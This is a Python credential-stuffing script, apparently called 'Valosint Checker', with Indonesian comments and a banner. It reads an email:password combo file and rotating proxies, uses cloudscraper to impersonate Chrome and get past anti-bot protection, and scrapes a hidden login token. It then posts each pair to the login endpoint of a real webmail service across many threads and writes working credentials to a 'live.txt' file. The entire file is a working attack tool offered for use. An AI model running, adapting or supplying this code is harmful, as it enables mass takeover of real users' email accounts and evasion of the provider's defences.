import cloudscraper
import random
import time
import os
import sys
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)

class ValosintChecker:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.logo = f"""
{Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
{Fore.CYAN}   |    \\ |    || |   | |     |    | |    || || ||_   _|
{Fore.CYAN}   |  |  ||  |  || |   | |     |  |  ||  |  || || |  | |  
{Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
{Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
{Fore.YELLOW}   =====================================================
{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (BYPASS V4)
{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}SATELLITE CONNECTED
{Fore.YELLOW}   =====================================================
        """

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def check_account(self, credential, proxies):
        if ":" not in credential: return
        email, password = credential.split(":")
        
        for char in ["|", "/", "-", "\\"]:
            sys.stdout.write(f"\r{Fore.BLUE}[{char}] {Fore.WHITE}Satelit Scanning: {Fore.CYAN}{email}...")
            sys.stdout.flush()
            time.sleep(0.05)

        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        try:
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            
            # Bikin Session baru yang nyamar jadi Chrome Windows 10
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}

            # 1. Buka halaman depan dulu buat ambil Cookies & Token
            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=15)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            token_input = soup.find('input', {'type': 'hidden'})
            token = token_input['value'] if token_input else ""

            # 2. Baru kirim data Login
            payload = {'email': email, 'password': password, 'token': token, 'login': 'submit'}
            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=15)

            ts = self._get_time()
            
            # 3. Cek hasil (Kita perluas kata kunci suksesnya)
            if res.status_code == 200 and any(x in res.url.lower() for x in ["dashboard", "mail", "inbox", "success", "my-account"]):
                print(f"\r{Fore.GREEN}[{ts}] [LIVE] {email}")
                if not os.path.exists("results"): os.makedirs("results")
                with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
                self.valid_count += 1
            else:
                # Menampilkan alasan DIE (Entah salah pass atau diblokir anti-bot)
                alasan = "Wrong Pass" if "invalid" in res.text.lower() else f"Blocked/Redirect: {res.url[:35]}..."
                print(f"\r{Fore.RED}[{ts}] [DIE]  {email} | {alasan}")
                self.bad_count += 1
        except Exception as e:
            print(f"\r{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} (Koneksi Putus)")

    def start(self):
        os.system('clear')
        print(self.logo)

        combo_file = input(f"{Fore.WHITE}Masukkan File Combo (email:pass): ")
        proxy_file = input(f"{Fore.WHITE}Masukkan File Proxy (ip:port) : ")
        thread_input = input(f"{Fore.WHITE}Jumlah Thread (cth: 10)      : ")
        
        if not os.path.exists(combo_file):
            print(f"{Fore.RED}[!] File Combo tidak ditemukan!")
            return

        threads = int(thread_input) if thread_input.isdigit() else 1
        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
        proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')] if os.path.exists(proxy_file) else []

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for acc in accounts:
                executor.submit(self.check_account, acc, proxies)

if __name__ == "__main__":
    ValosintChecker().start()
